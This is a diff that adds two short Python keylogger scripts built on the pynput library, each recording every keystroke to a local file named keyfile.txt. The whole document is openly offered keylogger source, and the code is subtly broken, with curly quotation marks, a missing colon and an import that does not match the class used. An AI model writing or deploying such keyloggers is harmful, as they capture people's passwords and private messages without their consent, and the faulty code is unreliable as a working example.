@@ -1,0 +1,33 @@
+### Script #1
+
+#! /usr/bin/python
+
+from pynput import keyboard
+
+def keyPressed(key):
+	print (str(key))
+	with open(“keyfile.txt”, ‘a’) as logKey
+		try:
+			char = key.char
+			logKey.write(char)
+		except:
+			print(“Error getting char”)
+
+if __name__ == “__main__”:
+	listener = keyboard.Listener(on_press=keyPressed)
+	listener.start()
+	input()
+
+### Script #2
+
+import pynput
+from pynput.keyboard import Key, listener
+import logging
+
+log_dir = r“/home/[your username directory here]”
+logging.basicConfig(filename = (log_dir + r“/keyfile.txt”), level=logging.DEBUG, format=’%(asctime)s: %(message)s’)
+
+def on_press(key):
+	logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+	listener.join()
